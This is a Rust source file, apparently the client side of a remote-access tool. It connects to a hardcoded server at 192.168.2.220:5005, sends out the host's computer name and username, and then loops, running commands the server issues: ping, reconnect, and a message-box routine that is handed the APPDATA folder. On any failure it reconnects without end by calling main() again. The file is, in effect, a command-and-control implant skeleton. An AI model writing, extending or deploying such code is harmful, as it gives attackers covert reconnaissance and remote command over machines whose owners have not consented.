#[allow(warnings)]

use std::io::{Result, Read, Write};
use std::net::TcpStream;

use components::message;
pub mod utilities;
mod components {
    pub mod message;
}

const SERVER : &str = "192.168.2.220";
const PORT : &str = "5005";

fn main() {
    match TcpStream::connect(format!("{}:{}", SERVER, PORT)) {
        Ok(mut stream) => {
            let computer_name = hostname::get().unwrap().into_string().unwrap().into_bytes();
            let appdata_folder = std::env::var("APPDATA").unwrap();
            let username = whoami::username();

            let client_object = format!("{{\"computer_name\": \"{}\", \"username\": \"{}\"}}", String::from_utf8_lossy(&computer_name), username);
            let mut buffer = [0; 1024];

            stream.write_all(client_object.as_bytes()).unwrap();
            loop {
                match stream.read(&mut buffer) {
                    Ok(0) | Err(_) => {
                        main();
                    }
                    Ok(bytes_read) => {
                        let command = String::from_utf8_lossy(&buffer[0..bytes_read]);
                        
                        match command.trim() {
                            "ping" => {
                                stream.write_all("ping".as_bytes()).unwrap();
                            }
                            "append" => {
                                stream.write_all("append".as_bytes()).unwrap();
                                main();
                            }
                            "message" => message::vb_box(&stream, appdata_folder.clone()),
                            
                            _ => continue
                        }
                    }
                }
            }
        }
        Err(_) => {
            main();
        }
    }
}